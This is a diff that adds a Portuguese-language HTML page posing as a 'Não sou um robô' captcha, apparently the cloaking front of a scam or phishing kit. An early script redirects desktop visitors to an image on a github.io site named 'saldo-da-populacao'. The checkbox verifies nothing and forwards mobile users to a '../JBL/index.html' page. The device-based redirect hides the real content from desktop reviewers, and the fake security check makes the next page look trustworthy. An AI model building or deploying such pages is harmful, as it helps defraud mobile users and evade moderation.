@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Captcha Simplificado</title>
+<script type="text/javascript">
+    // Verifica o dispositivo e redireciona antes de carregar outros recursos
+    if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+      window.location.replace('https://saldo-da-populacao.github.io/Consulta/Hiroyoung.webp');
+    }
+  </script>
+<style>
+body {
+  background: #f0f0f0;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  height: 100vh;
+  margin: 0;
+  font-family: Arial, sans-serif;
+}
+
+.captcha-container {
+  background: white;
+  border-radius: 8px;
+  padding: 25px;
+  text-align: center;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+}
+
+.captcha-checkbox {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  margin-top: 20px;
+  padding: 15px;
+  border: 2px solid #ddd;
+  border-radius: 8px;
+  background-color: #f9f9f9;
+}
+
+.checkbox {
+  width: 24px;
+  height: 24px;
+  border: 2px solid #999;
+  border-radius: 4px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  transition: all 0.2s ease;
+}
+
+.checkbox.checked {
+  background: #4CAF50;
+  border-color: #4CAF50;
+}
+
+.checkbox.checked::after {
+  content: "✓";
+  color: white;
+  font-size: 16px;
+  font-weight: bold;
+}
+
+.checkbox-label {
+  font-size: 16px;
+  cursor: pointer;
+}
+</style>
+</head>
+
+<body>
+
+<div class="captcha-container">
+  <h2>Confirmação de Segurança</h2>
+  <p>Marque a caixa abaixo para confirmar que você não é um robô:</p>
+
+  <div class="captcha-checkbox">
+    <div class="checkbox" id="captchaCheckbox"></div>
+    <span class="checkbox-label">Não sou um robô</span>
+  </div>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+  const checkbox = document.getElementById('captchaCheckbox');
+  const label = document.querySelector('.checkbox-label');
+
+  function verifyCaptcha() {
+    checkbox.classList.add('checked');
+
+    setTimeout(() => {
+      window.location.href = '../JBL/index.html';
+    }, 300); // pequeno delay só para o usuário ver o check
+  }
+
+  checkbox.addEventListener('click', verifyCaptcha);
+  label.addEventListener('click', verifyCaptcha);
+});
+</script>
+
+</body>
+</html>
